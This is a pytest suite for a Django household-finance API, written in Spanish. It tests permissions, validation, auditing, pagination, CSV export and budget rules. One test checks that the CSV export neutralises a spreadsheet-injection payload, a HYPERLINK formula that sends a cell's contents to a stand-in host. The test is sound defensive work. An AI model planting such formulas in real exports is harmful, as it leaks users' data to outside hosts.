import csv
import io
from datetime import date, timedelta
from decimal import Decimal

import pytest
from django.utils import timezone

from conftest import CategoriaFactory, CuentaFactory, HogarFactory, MovimientoFactory
from core.models import RegistroAuditoria
from finanzas.models import Comercio, Movimiento, Presupuesto

pytestmark = pytest.mark.django_db


@pytest.fixture
def escenario(hogar_con_roles):
    hogar, roles = hogar_con_roles
    cuenta = CuentaFactory(hogar=hogar, nombre="Común")
    comida = CategoriaFactory(hogar=hogar, nombre="Comida")
    super_ = CategoriaFactory(hogar=hogar, nombre="Súper", padre=comida)
    return hogar, roles, cuenta, comida, super_


def url(hogar, recurso="movimientos"):
    return f"/api/v1/hogares/{hogar.pk}/{recurso}/"


@pytest.mark.parametrize(
    "rol, metodo, esperado",
    [
        ("lector", "get", 200),
        ("lector", "post", 403),
        ("miembro", "post", 201),
        ("miembro", "delete", 403),
        ("admin", "delete", 204),
        ("ajeno", "get", 404),
    ],
)
def test_matriz_permisos_movimientos(cliente, escenario, rol, metodo, esperado):
    hogar, roles, cuenta, comida, _ = escenario
    c = cliente(roles[rol])
    if metodo == "get":
        r = c.get(url(hogar))
    elif metodo == "post":
        r = c.post(url(hogar), {"fecha": "2026-10-01", "importe": "-12.50", "concepto": "Pan", "cuenta": cuenta.pk})
    else:
        m = MovimientoFactory(cuenta=cuenta)
        r = c.delete(f"{url(hogar)}{m.pk}/")
    assert r.status_code == esperado, getattr(r, "data", None)


def test_no_se_puede_usar_categoria_de_otro_hogar(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    ajena = CategoriaFactory(hogar=HogarFactory())
    r = cliente(roles["miembro"]).post(
        url(hogar),
        {"fecha": "2026-10-01", "importe": "-5", "concepto": "x", "cuenta": cuenta.pk, "categoria": ajena.pk},
    )
    assert r.status_code == 400 and "categoria" in r.json()["errors"]


def test_validaciones_y_formato_de_error(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    manana = (timezone.localdate() + timedelta(days=1)).isoformat()
    r = cliente(roles["miembro"]).post(
        url(hogar), {"fecha": manana, "importe": "0", "concepto": "", "cuenta": cuenta.pk}
    )
    assert r.status_code == 400
    assert set(r.json()["errors"]) == {"fecha", "importe", "concepto"}


def test_crear_reconoce_comercio_y_audita(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    Comercio.objects.create(nombre="Mercadona")
    r = cliente(roles["miembro"]).post(
        url(hogar),
        {
            "fecha": "2026-10-01",
            "importe": "-30",
            "concepto": "MERCADONA SA 0042",
            "cuenta": cuenta.pk,
            "etiquetas": ["Casa ", "casa", "Mes"],
        },
    )
    assert r.status_code == 201
    assert r.json()["comercio"]["nombre"] == "Mercadona"
    assert r.json()["etiquetas"] == ["casa", "mes"]
    assert RegistroAuditoria.objects.filter(accion="crear", usuario=roles["miembro"]).count() == 1


def test_si_falla_la_auditoria_no_se_guarda_el_cambio(cliente, escenario, monkeypatch):
    hogar, roles, cuenta, *_ = escenario
    pan = MovimientoFactory(cuenta=cuenta, concepto="Pan")

    def auditoria_caida(*args, **kwargs):
        raise RuntimeError("auditoría caída")

    monkeypatch.setattr("finanzas.api.views.registrar", auditoria_caida)
    c = cliente(roles["miembro"])
    nuevo = {"fecha": "2026-10-01", "importe": "-5", "concepto": "Leche", "cuenta": cuenta.pk}
    assert c.post(url(hogar), nuevo).status_code == 500
    assert c.patch(f"{url(hogar)}{pan.pk}/", {"concepto": "Pan integral"}).status_code == 500
    # perform_create y perform_update son atómicos: sin su registro de auditoría, el cambio no queda
    assert list(Movimiento.objects.values_list("concepto", flat=True)) == ["Pan"]


def test_filtros_categoria_padre_incluye_hijas_y_tipo(cliente, escenario):
    hogar, roles, cuenta, comida, super_ = escenario
    MovimientoFactory(cuenta=cuenta, categoria=comida, importe=Decimal("-1"))
    MovimientoFactory(cuenta=cuenta, categoria=super_, importe=Decimal("-2"))
    MovimientoFactory(cuenta=cuenta, importe=Decimal("100"))
    c = cliente(roles["lector"])
    assert len(c.get(url(hogar), {"categoria": comida.pk}).json()["results"]) == 2
    assert len(c.get(url(hogar), {"tipo": "ingreso"}).json()["results"]) == 1
    assert len(c.get(url(hogar), {"sin_categoria": "true"}).json()["results"]) == 1


def test_paginacion_por_cursor_y_ordenacion(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    for i in range(60):
        MovimientoFactory(cuenta=cuenta, fecha=date(2026, 1, 1) + timedelta(days=i))
    c = cliente(roles["lector"])
    p1 = c.get(url(hogar)).json()
    assert len(p1["results"]) == 50 and p1["next"] and "cursor=" in p1["next"]
    p2 = c.get(p1["next"]).json()
    assert len(p2["results"]) == 10
    assert p1["results"][0]["fecha"] == "2026-03-01"  # el más reciente primero
    por_importe = c.get(url(hogar), {"ordering": "importe"}).json()
    assert "count" in por_importe  # con ordering: paginación numérica


def test_listado_consultas_constantes(cliente, escenario, django_assert_num_queries):
    hogar, roles, cuenta, comida, _ = escenario
    c = cliente(roles["lector"])
    MovimientoFactory.create_batch(3, cuenta=cuenta, categoria=comida)
    # La primera petición del proceso consulta además el ContentType de Movimiento (para los adjuntos) y lo
    # guarda en la caché de ContentType: se hace antes de medir, para que la cuenta no dependa del orden de los tests.
    c.get(url(hogar))
    with django_assert_num_queries(2) as capturadas:  # membresía + movimientos
        c.get(url(hogar))
    MovimientoFactory.create_batch(30, cuenta=cuenta, categoria=comida)
    with django_assert_num_queries(len(capturadas)):
        c.get(url(hogar))


def test_recategorizar_en_bloque_solo_del_hogar(cliente, escenario):
    hogar, roles, cuenta, comida, _ = escenario
    mios = MovimientoFactory.create_batch(3, cuenta=cuenta, revisado=False)
    ajeno = MovimientoFactory()
    r = cliente(roles["miembro"]).post(
        f"{url(hogar)}recategorizar/", {"ids": [m.pk for m in mios] + [ajeno.pk], "categoria": comida.pk}
    )
    assert r.json() == {"actualizados": 3}
    ajeno.refresh_from_db()
    assert ajeno.categoria_id is None


def test_exportar_csv(cliente, escenario):
    hogar, roles, cuenta, comida, _ = escenario
    MovimientoFactory(cuenta=cuenta, concepto="Pan", importe=Decimal("-1.20"), categoria=comida, etiquetas=["casa"])
    r = cliente(roles["lector"]).get(f"{url(hogar)}exportar/")
    contenido = b"".join(r.streaming_content).decode()
    assert r["Content-Type"].startswith("text/csv")
    assert "Pan;-1,20;Común;Comida;casa" in contenido


def test_exportar_csv_sin_formulas(cliente, escenario):
    """CSV injection: un concepto del banco que empieza por "=" se abre como texto, no como fórmula."""
    hogar, roles, cuenta, *_ = escenario
    concepto = '=HYPERLINK("https://ejemplo.test/?d="&A2;"Ver")'
    MovimientoFactory(cuenta=cuenta, concepto=concepto, importe=Decimal("-12.50"), etiquetas=["@casa", "viaje"])
    r = cliente(roles["lector"]).get(f"{url(hogar)}exportar/")
    filas = list(csv.reader(io.StringIO(b"".join(r.streaming_content).decode()), delimiter=";"))
    assert filas[1][1:] == ["'" + concepto, "-12,50", "Común", "", "'@casa,viaje"]  # el importe, sin apóstrofo


def test_presupuesto_con_gastado_incluye_subcategorias(cliente, escenario):
    hogar, roles, cuenta, comida, super_ = escenario
    Presupuesto.objects.create(hogar=hogar, categoria=comida, mes=date(2026, 10, 1), importe=Decimal("100"))
    MovimientoFactory(cuenta=cuenta, categoria=comida, fecha=date(2026, 10, 5), importe=Decimal("-20"))
    MovimientoFactory(cuenta=cuenta, categoria=super_, fecha=date(2026, 10, 31), importe=Decimal("-30"))
    MovimientoFactory(cuenta=cuenta, categoria=super_, fecha=date(2026, 11, 1), importe=Decimal("-99"))
    r = cliente(roles["lector"]).get(url(hogar, "presupuestos"), {"mes": "2026-10"})
    assert r.json()[0]["gastado"] == "-50.00" and r.json()[0]["porcentaje"] == 50


def test_saldo_de_cuentas_y_reordenar_categorias(cliente, escenario):
    hogar, roles, cuenta, comida, super_ = escenario
    MovimientoFactory(cuenta=cuenta, importe=Decimal("1000"))
    MovimientoFactory(cuenta=cuenta, importe=Decimal("-250.5"))
    assert cliente(roles["lector"]).get(url(hogar, "cuentas")).json()[0]["saldo"] == "749.50"
    r = cliente(roles["miembro"]).post(f"{url(hogar, 'categorias')}reordenar/", {"ids": [super_.pk, comida.pk]})
    assert r.status_code == 204
    super_.refresh_from_db()
    assert super_.orden == 0
    assert Movimiento.objects.count() == 2


def errores(r) -> dict:
    assert r.status_code == 400, r.content
    return r.json()["errors"]


def test_presupuesto_con_importe_mayor_que_cero(cliente, escenario):
    hogar, roles, _, comida, _ = escenario
    r = cliente(roles["admin"]).post(
        url(hogar, "presupuestos"), {"categoria": comida.pk, "mes": "2026-10-01", "importe": "0"}
    )
    assert errores(r) == {"importe": ["El importe debe ser mayor que cero."]}


def test_un_presupuesto_por_categoria_y_mes(cliente, escenario):
    hogar, roles, _, comida, super_ = escenario
    Presupuesto.objects.create(hogar=hogar, categoria=comida, mes=date(2026, 10, 1), importe=Decimal("10"))
    c = cliente(roles["admin"])
    r = c.post(url(hogar, "presupuestos"), {"categoria": comida.pk, "mes": "2026-10-15", "importe": "20"})
    assert errores(r) == {"categoria": ["Ya hay un presupuesto de esta categoría para ese mes."]}
    otro = Presupuesto.objects.create(hogar=hogar, categoria=super_, mes=date(2026, 10, 1), importe=Decimal("5"))
    assert "categoria" in errores(c.patch(f"{url(hogar, 'presupuestos')}{otro.pk}/", {"categoria": comida.pk}))
    assert c.patch(f"{url(hogar, 'presupuestos')}{otro.pk}/", {"importe": "6"}).status_code == 200  # él mismo no cuenta


def test_nombre_de_cuenta_unico_en_el_hogar(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    CuentaFactory(hogar=HogarFactory(), nombre="Tarjeta")  # en otro hogar no choca
    c = cliente(roles["admin"])
    assert errores(c.post(url(hogar, "cuentas"), {"nombre": "Común"})) == {
        "nombre": ["Ya hay una cuenta con ese nombre."]
    }
    assert c.post(url(hogar, "cuentas"), {"nombre": "Tarjeta"}).status_code == 201
    assert c.patch(f"{url(hogar, 'cuentas')}{cuenta.pk}/", {"nombre": "Común"}).status_code == 200


def test_nombre_de_categoria_unico_en_su_nivel(cliente, escenario):
    hogar, roles, _, comida, _ = escenario
    c = cliente(roles["miembro"])
    assert errores(c.post(url(hogar, "categorias"), {"nombre": "Comida"})) == {
        "nombre": ["Ya hay una categoría con ese nombre en este nivel."]
    }
    assert "nombre" in errores(c.post(url(hogar, "categorias"), {"nombre": "Súper", "padre": comida.pk}))
    assert c.post(url(hogar, "categorias"), {"nombre": "Súper"}).status_code == 201  # en la raíz no hay otra


def test_color_de_categoria_en_formato_hexadecimal(cliente, escenario):
    hogar, roles, _, comida, _ = escenario
    c = cliente(roles["miembro"])
    r = c.post(url(hogar, "categorias"), {"nombre": "Ropa", "color": "rojo"})
    assert errores(r) == {"color": ["El color debe tener el formato #rrggbb."]}
    assert c.patch(f"{url(hogar, 'categorias')}{comida.pk}/", {"color": "#FF9800"}).status_code == 200


def test_borrar_una_cuenta_con_movimientos(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    MovimientoFactory(cuenta=cuenta)
    c = cliente(roles["admin"])
    r = c.delete(f"{url(hogar, 'cuentas')}{cuenta.pk}/")
    assert r.status_code == 409
    assert r.json()["type"] == "cuenta_con_movimientos" and r.json()["title"].startswith("La cuenta tiene movimientos")
    vacia = CuentaFactory(hogar=hogar, nombre="Vacía")
    assert c.delete(f"{url(hogar, 'cuentas')}{vacia.pk}/").status_code == 204


def test_jerarquia_de_categorias_de_dos_niveles(cliente, escenario):
    hogar, roles, _, comida, super_ = escenario
    ocio = CategoriaFactory(hogar=hogar, nombre="Ocio")
    c = cliente(roles["miembro"])
    cats = url(hogar, "categorias")
    assert errores(c.patch(f"{cats}{ocio.pk}/", {"padre": ocio.pk})) == {
        "padre": ["Una categoría no puede ser su propia madre."]
    }
    assert errores(c.patch(f"{cats}{comida.pk}/", {"padre": ocio.pk})) == {  # Ocio › Comida › Súper
        "padre": ["Una categoría con subcategorías no puede colgar de otra."]
    }
    assert errores(c.post(cats, {"nombre": "Fruta", "padre": super_.pk})) == {
        "padre": ["Solo se permiten dos niveles de categorías."]
    }
    assert c.patch(f"{cats}{super_.pk}/", {"padre": ocio.pk}).status_code == 200  # una hoja sí cambia de madre


def test_crear_un_presupuesto_devuelve_lo_gastado(cliente, escenario):
    hogar, roles, cuenta, comida, super_ = escenario
    MovimientoFactory(cuenta=cuenta, categoria=super_, fecha=date(2026, 10, 3), importe=Decimal("-25"))
    r = cliente(roles["admin"]).post(
        url(hogar, "presupuestos"), {"categoria": comida.pk, "mes": "2026-10-20", "importe": "100"}
    )
    assert r.status_code == 201
    assert (r.json()["mes"], r.json()["gastado"], r.json()["porcentaje"]) == ("2026-10-01", "-25.00", 25)
